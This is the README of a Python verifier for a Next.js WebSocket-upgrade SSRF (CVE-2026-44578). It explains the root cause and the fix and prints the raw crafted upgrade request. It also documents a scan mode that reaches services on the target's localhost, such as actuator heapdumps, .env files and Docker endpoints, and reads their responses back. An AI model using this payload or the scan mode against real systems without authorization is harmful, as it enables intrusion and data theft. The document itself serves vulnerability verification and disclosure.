# verify-ghsa-c4j6-fc7j-m34r

In-band verifier for **GHSA-c4j6-fc7j-m34r** / **CVE-2026-44578** — Server-Side
Request Forgery in Next.js via WebSocket upgrade requests.

> ⚠️ For authorized security testing only. You are responsible for ensuring you
> have permission to test every target you pass to this script.

## The vulnerability

| Field | Value |
|---|---|
| CVE | CVE-2026-44578 |
| GHSA | [GHSA-c4j6-fc7j-m34r](https://github.com/advisories/GHSA-c4j6-fc7j-m34r) |
| CWE | CWE-918 (SSRF) |
| CVSS v3.1 | 8.6 (High) — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| Affected | `next >=13.4.13 <15.5.16`, `>=16.0.0 <16.2.5` |
| Patched | `15.5.16`, `16.2.5` |
| Fix commit | [`c4f69086`](https://github.com/vercel/next.js/commit/c4f69086cc8dcbd81b1dbc321c98ea874d90d6f8) |
| Not affected | Vercel-hosted; `output: "export"`; deployments behind a reverse proxy that does not forward `Upgrade` |

### How the bug actually works (verified empirically against 15.5.15 vs 15.5.16)

1. An attacker opens a TCP connection to a self-hosted Next.js process and
   sends an HTTP/1.1 WebSocket upgrade whose request-URI is an absolute URL:

   ```
   GET http://anything/<path> HTTP/1.1
   Host: <target>
   Connection: Upgrade
   Upgrade: websocket
   Sec-WebSocket-Version: 13
   Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
   ```
2. In `resolveRoutes`, the URL contains `//` (every absolute URI does), which
   matches the "normalize repeated slashes" branch. That branch returns early
   with `{ finished: true, statusCode: 308, parsedUrl: <mangled> }`. The
   normalizer collapses `http://host/path` into `http:/host/path` (one slash).
3. In `router-server.ts`, the **pre-patch** upgrade handler ignored
   `finished`/`statusCode` and only checked `parsedUrl.protocol`. Since the
   protocol survives normalization, it called `proxyRequest(...)`.
4. `proxyRequest` runs `url.format(parsedUrl)` on the mangled URL, getting
   `http:/host:port/path`. `http-proxy` parses that target, finds no host
   (`url.parse('http:/...').host === null`), and falls back to its default
   destination: **`localhost:80`** (or `localhost:443` for `https`).
5. So in practice the SSRF lets you make Next open a WebSocket upgrade to
   the **Next.js host's own `localhost:80` / `localhost:443`** with an
   attacker-controlled path.

The **fix** (commit `c4f69086`) made the upgrade handler check
`finished && !statusCode` before proxying. The 308-normalization case now
fails the `!statusCode` check and the socket is closed instead.

### Why a callback-based OOB verifier won't work for this CVE

The proxy never reaches an external host. If you set up an interactsh /
Burp Collaborator / webhook canary and expect the Next process to phone home,
**it will not** — the connection goes to `localhost` on the target machine.
This verifier therefore uses an **in-band signal** read from the upgrade
socket: a vulnerable server returns a recognizable error body, a patched
server returns nothing.

### Practical impact

The SSRF target is restricted but still meaningful in real deployments:

- Sidecar containers / reverse proxies / admin panels co-located on the same
  host that bind `127.0.0.1:80` or `:443` and trust localhost-originated
  requests.
- Docker socket exposed over HTTP on `127.0.0.1:80` (uncommon but seen).
- Path traversal into any localhost HTTP service with attacker-controlled
  URI path and WebSocket upgrade semantics.

AWS / GCP / Azure metadata endpoints (`169.254.169.254`) are *not* directly
reachable because the bug pins the destination to localhost.

## Detection model

For each target, the script opens a raw TCP (or TLS) socket, sends the
crafted upgrade, reads the response, and produces two signals:

- **`verdict`** — whether the bug is present.
- **`impact_confirmed`** — whether the SSRF actually exfiltrated data
  (i.e. a co-located service on `localhost:80/443` of the target answered
  and we got its response back).

| Response | Verdict | `impact_confirmed` |
|---|---|---|
| Contains `Internal Server Error` | `vulnerable` | `false` — bug proven, but proxy hit nothing on localhost |
| Starts with `HTTP/1.` | `vulnerable_proxy_succeeded` | `true` — real response data exfiltrated |
| Empty / clean close | `likely_patched` | `false` — also covers "not Next", "reverse proxy stripped Upgrade", "Vercel" |
| Anything else | `inconclusive` | `false` |

When `impact_confirmed` is true the JSON output also includes
`upstream_status`, `upstream_server` and `upstream_content_type` parsed
from the leaked response (useful for triage / report-writing).

## Requirements

- Python 3.10+
- No third-party dependencies (stdlib only)

## Usage

```bash
# single target
python3 verify_ghsa_c4j6.py --target https://app.example.com

# multiple targets via flag repetition
python3 verify_ghsa_c4j6.py \
    --target https://app1.example.com \
    --target app2.example.com:3000 \
    --target 10.0.0.5:80

# from a file (one target per line; '#' for comments)
python3 verify_ghsa_c4j6.py --targets-file targets.txt

# from stdin
cat targets.txt | python3 verify_ghsa_c4j6.py

# JSON Lines output for downstream tooling
python3 verify_ghsa_c4j6.py --targets-file targets.txt --json

# Enumerate co-located services on the target's localhost:80/443 via the bug
python3 verify_ghsa_c4j6.py --target https://app.example.com --scan

# Same, with a custom path list
python3 verify_ghsa_c4j6.py --target ... --scan-paths-file my_paths.txt
```

### Scan mode

`--scan` probes a built-in list of common paths (Apache/nginx status modules,
health & metrics endpoints, Spring Boot Actuator, Go pprof, Docker daemon
endpoints, common admin panels, leaky config files, Elasticsearch routes,
etc.) through the SSRF gadget. Output is grouped per target:

```
=== 10.0.0.5:443 ===
  [VULN+] /                              impact=YES  status=200  ct='text/html'
  [VULN+] /server-status                 impact=YES  status=403  ct='text/html'
  [VULN+] /actuator/env                  impact=YES  status=200  ct='application/json'
  [VULN+] /actuator/heapdump             impact=YES  status=200  ct='application/octet-stream'
  [VULN+] /wp-admin/                     impact=YES  status=404  ct='text/html'
  [ VULN] /.env                          impact= -
  -> 5/6 paths reached a service
  -> upstream server(s) seen: nginx/1.24.0
```

Hits (impact=YES) reveal what HTTP service is co-located on the target's
localhost — that's where the actual exploitation primitives live (data read
via GET, auth bypass via 127.0.0.1 allowlists, etc.). When every path
returns `impact= -` (just `Internal Server Error`), the bug is present but
nothing is listening on `localhost:80/443` of that host.

### Flags

| Flag | Description | Default |
|---|---|---|
| `--target URL` | A single target. Repeat for multiple. | — |
| `--targets-file PATH` | File with one target per line. | — |
| `--probe-path PATH` | Path used in the crafted absolute URI. Reaches the target's localhost service at this path (logged on a per-target token suffix). | `/x` |
| `--scan` | Enumerate common paths on each target's localhost service. | off |
| `--scan-paths-file PATH` | Custom path list for scan mode (one per line). Implies `--scan`. | built-in |
| `--timeout SEC` | Per-socket timeout. | `5` |
| `--concurrency N` | Parallel probes. | `10` |
| `--insecure` | Skip TLS certificate verification. | off |
| `--json` | Emit JSON Lines instead of human text. | off |

Targets may be `host`, `host:port`, or full `http(s)://...` URLs.

## Reproducing locally

You can run a vulnerable lab in five commands:

```bash
mkdir vuln-lab && cd vuln-lab
npm init -y && npm i next@15.5.15 react@19 react-dom@19
mkdir pages && echo 'export default () => "ok"' > pages/index.js
npx next build && npx next start -p 3030 &
python3 ../verify_ghsa_c4j6.py --target 127.0.0.1:3030
```

Output:

```
[ VULN] target=127.0.0.1:3030  verdict=vulnerable  impact= no
        snippet: 'Internal Server Error'
```

Repeat with `next@15.5.16` and you should see `verdict=likely_patched`.

### Impact demo (real data exfiltration)

`demo_impact.sh` runs Next on `:80` (so its localhost-pinned SSRF target
*is* the same Next process) and reads Next's own HTML back through the
bug. Requires `sudo` for the privileged port bind.

```bash
LAB_DIR=/path/to/next-vuln-lab ./demo_impact.sh
```

Expected output ends with `IMPACT CONFIRMED — SSRF reached a service on
the target localhost and read response data back`.

## Caveats

- **False negatives**: any reverse proxy in front of Next that does not
  forward the `Upgrade` header will mask the vulnerability; the script will
  report `likely_patched`. Re-test directly against the Next process if you
  can.
- **False positives**: the literal string `Internal Server Error` could
  theoretically be returned by an upstream proxy on its own. To rule that
  out, re-send the same payload with `Connection: close` instead of
  `Connection: Upgrade` — a real vulnerable Next stops returning the
  Internal Server Error body in that case (different code path).
- **HTTP/2-only targets**: not handled. `next start` defaults to HTTP/1.1.

## Responsible use

Test only systems you own or have explicit, written authorization to assess.

## References

- Advisory: <https://github.com/advisories/GHSA-c4j6-fc7j-m34r>
- Next.js v15.5.16 release: <https://github.com/vercel/next.js/releases/tag/v15.5.16>
- Next.js v16.2.5 release: <https://github.com/vercel/next.js/releases/tag/v16.2.5>
- Fix commit: <https://github.com/vercel/next.js/commit/c4f69086cc8dcbd81b1dbc321c98ea874d90d6f8>

## License

MIT
